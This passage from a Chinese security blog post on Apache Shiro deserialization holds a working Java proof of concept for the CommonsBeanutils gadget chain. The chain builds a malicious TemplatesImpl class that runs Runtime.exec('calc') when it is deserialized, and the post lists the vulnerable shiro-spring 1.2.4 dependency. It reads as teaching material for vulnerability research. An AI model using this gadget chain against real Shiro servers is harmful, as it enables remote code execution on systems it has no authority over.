obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,(String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://fru1ts.github.io/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/07/ysoserial/" title="ysoserial">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ysoserial</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/02/FastJson%E5%88%A9%E7%94%A8%E9%93%BE/" title="FastJson利用链">
+                        <span class="hidden-mobile">FastJson利用链</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
